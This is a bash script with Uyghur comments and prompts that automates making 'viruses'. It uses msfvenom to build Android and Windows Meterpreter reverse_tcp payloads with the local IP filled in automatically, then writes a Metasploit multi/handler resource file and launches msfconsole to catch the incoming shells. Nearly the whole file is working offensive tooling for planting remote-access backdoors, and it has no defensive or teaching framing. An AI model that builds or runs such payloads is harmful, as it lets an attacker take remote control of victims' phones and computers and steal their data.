#!/bin/bash
# bu meming tunji tegkodum. msfvenom ning meshgulatini asanlashturup beridu.
# ip nomurlirini aptumatik toldurup beridu.

clear
spd-say "essalam eleykum. qandak ehwa. lee. neez.  Bu teg kod nee boog. ra.  go roo pee see  yaz dee. "
IP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk -F'[/ ]+' '{print $3}')
echo "$(tput bold)$(tput setaf 2)Sizning IP adresingiz"  
echo $IP 

printf "Virusning Port nomurini kirguzung:"
echo "(port dairisi 1 din 65000 giche san bolsa bolidu)"
read LPORT
clear

echo "1. Yanfon uchun virus yasash."
echo "2. Windows uchun virus yasash."
echo "Qaysi hildiki virusni halisingiz xu nomurni kirguzung."
read virusTuri
clear

if [ $virusTuri -eq 1 ]; then
clear
echo "Bir az saqlap turung..."
echo "Hasil bolghan virusning ismi port nomuri boyiche bolup, DEsktop'tin tapalaysiz..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$LPORT  -o /root/Desktop/$LPORT.apk;
echo "   "
echo "   "

echo "Virusnining orni:  /root/Desktop/"$LPORT.exe 
echo "Eskertish!!! virusning yollighan uchurini qubul qilish uchun "$IP " ni LHOST , "$LPORT " ni LPORT qilip kirguzing. muwfppiqiyet tileymen!!!"
echo use exploit/multi/handler >> /root/Desktop/$LPORT.rf
echo set payload android/meterpreter/reverse_tcp >> /root/Desktop/$LPORT.rf
echo set LHOST $IP >> /root/Desktop/$LPORT.rf
echo set LPORT $LPORT >> /root/Desktop/$LPORT.rf
echo run -j >> /root/Desktop/$LPORT.rf

clear
echo "Bir az saqlang... hazir virsu uchurini qubul qilidighan 'Hanler'ga kirisiz... "
msfconsole -r /root/Desktop/$LPORT.rf



elif [ $virusTuri -eq 2 ]; then
clear
echo "Bir az saqlap turung..."
echo "Hasil bolghan virusning ismi port nomuri boyiche bolup, DEsktop'tin tapalaysiz..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$LPORT -f exe -o /root/Desktop/$LPORT.exe;
echo "   "
echo "   "

echo "Virusnining orni:  /root/Desktop/"$LPORT.exe 
echo "Eskertish!!! virusning yollighan uchurini qubul qilish uchun "$IP " ni LHOST , "$LPORT " ni LPORT qilip kirguzing. muwfppiqiyet tileymen!!!"

echo "Virusnining orni:  /root/Desktop/"$LPORT.exe 
echo "Eskertish!!! virusning yollighan uchurini qubul qilish uchun "$IP " ni LHOST , "$LPORT " ni LPORT qilip kirguzing. muwfppiqiyet tileymen!!!"
echo use exploit/multi/handler >> /root/Desktop/$LPORT.rf
echo set payload windows/meterpreter/reverse_tcp >> /root/Desktop/$LPORT.rf
echo set LHOST $IP >> /root/Desktop/$LPORT.rf
echo set LPORT $LPORT >> /root/Desktop/$LPORT.rf
echo run -j >> /root/Desktop/$LPORT.rf

clear
echo "Bir az saqlang... hazir virsu uchurini qubul qilidighan 'Hanler'ga kirisiz... "

msfconsole -r /root/Desktop/$LPORT.rf


else 
	echo "Hata uchur kirguzdiingiz..."
fi

echo "$(tput setaf 3)Bu qoralni ishletkinigizge kop rehmet..."

